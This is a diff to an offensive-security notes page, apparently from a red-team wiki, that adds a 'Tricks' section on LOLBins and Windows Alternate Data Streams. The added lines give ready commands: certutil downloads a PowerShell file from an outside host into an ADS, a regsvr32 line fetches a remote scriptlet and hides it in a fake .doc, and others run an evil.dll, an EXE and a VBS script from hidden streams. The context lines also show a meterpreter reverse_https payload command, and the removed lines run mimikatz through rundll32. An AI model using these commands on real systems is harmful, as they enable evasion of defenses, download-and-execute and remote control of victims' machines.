@@ -1,4 +1,46 @@
-# Alternative Payloads
+# Tricks
+
+## LOLBins
+
+&#x20;Using [LOLBins](https://lolbas-project.github.io/#) we can bypass some protections and execute malicious payloads.
+
+{% embed url="https://lolbas-project.github.io" %}
+
+{% hint style="info" %}
+To search for a specific function in LOL binaries, use `/function` key word. for example : `/execute`
+{% endhint %}
+
+## Alternative Data Streams
+
+Execute a .EXE file stored as an Alternate Data Stream (ADS)
+
+```
+wmic.exe process call create "c:\ads\file.txt:program.exe"
+```
+
+Download and save a PS1 file to an Alternate Data Stream (ADS).
+
+```
+certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
+```
+
+Add content to an Alternate Data Stream (ADS).
+
+```
+cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat
+```
+
+Execute evil.dll which is stored in an Alternate Data Stream (ADS).
+
+```
+control.exe c:\windows\tasks\file.txt:evil.dll
+```
+
+Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS).
+
+```
+cscript c:\ads\file.txt:script.vbs
+```
 
 ## Using DLLs & macros
 
@@ -28,15 +70,6 @@ or
 python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde
 ```
 
-## LOLBins
-
-&#x20;Using [LOLBins](https://lolbas-project.github.io/#) we can bypass some protections when executing malicious  DLLs.
-
-```
-C:\> rundll32.exe CALC.dll,DoesntExist
-C:\> rundll32.exe mimikatz.dll,Main
-```
-
 ## System DLLs
 
 we can use functions from system DLLs such as CMD screensaver.
@@ -59,16 +92,3 @@ we can do the same with powershell:
 ```
 Powershell.exe -Command Set-ExecutionPolicy RemoteSigned -Scope Process; Powershell.exe -File "path to master script"
 ```
-
-
-
-
-
-
-
-
-
-
-
-
-
